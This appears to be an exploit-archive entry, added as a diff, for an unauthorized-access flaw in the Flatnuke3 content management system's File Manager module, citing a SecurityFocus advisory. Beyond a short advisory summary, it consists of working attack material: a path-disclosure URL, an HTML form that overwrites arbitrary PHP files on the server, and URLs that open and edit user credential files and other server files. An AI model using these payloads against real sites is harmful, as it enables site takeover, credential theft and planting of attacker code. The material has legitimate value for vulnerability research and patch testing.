@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/26155/info
+
+Flatnuke3 is prone to an unauthorized-access vulnerability because it fails to adequately verify administrative credentials while logging in via the 'File Manager' module.
+
+An attacker can exploit this vulnerability to gain administrative control of the application; other attacks are also possible.
+
+This issue affects Flatnuke3-2007-10-10; other versions may also be vulnerable. 
+
+Full Path Disclosure Example:
+
+http://www.example.com/flatnuke3_path/index.php?mod=[forum_path]
+&op=disc&argumentname=[a_casual_char]
+---------------------------------------------------------------
+File Replace Exploit:
+
+<form method="post" action="http://www.example.com/flatnuke3_path/index.php?
+mod=none_filemanager&amp;op="><textarea id="body" name="body" cols="90" rows="
+35">
+&lt;/textarea&gt;<br><input value="Save" type="submit"><input type="reset">
+<input name="opmod" value="save" type="hidden">
+<input name="ffile" value="[file_name].php" type="hidden">
+<input name="dir" value="/[script_path]/[file_path]" type="hidden"><input
+class="button" onclick="history.back()" value="Annulla" type="button"></form>
+---------------------------------------------------------------
+User Credential View/Edit Exploit:
+
+http://www.example.com/flatnuke3_path/index.php?mod=none_filemanager&dir=/
+[script_path]/[flatnuke3_path]/misc/fndatabase/users/&ffile=[username].
+php&opmod=open&op=
+
+Or, for example u can view and edit a file located on the server:
+
+http://www.example.com/flatnuke3_path/index.php?mod=none_filemanager&dir=/
+[script_path]/&ffile=[file]&opmod=open&op=
+
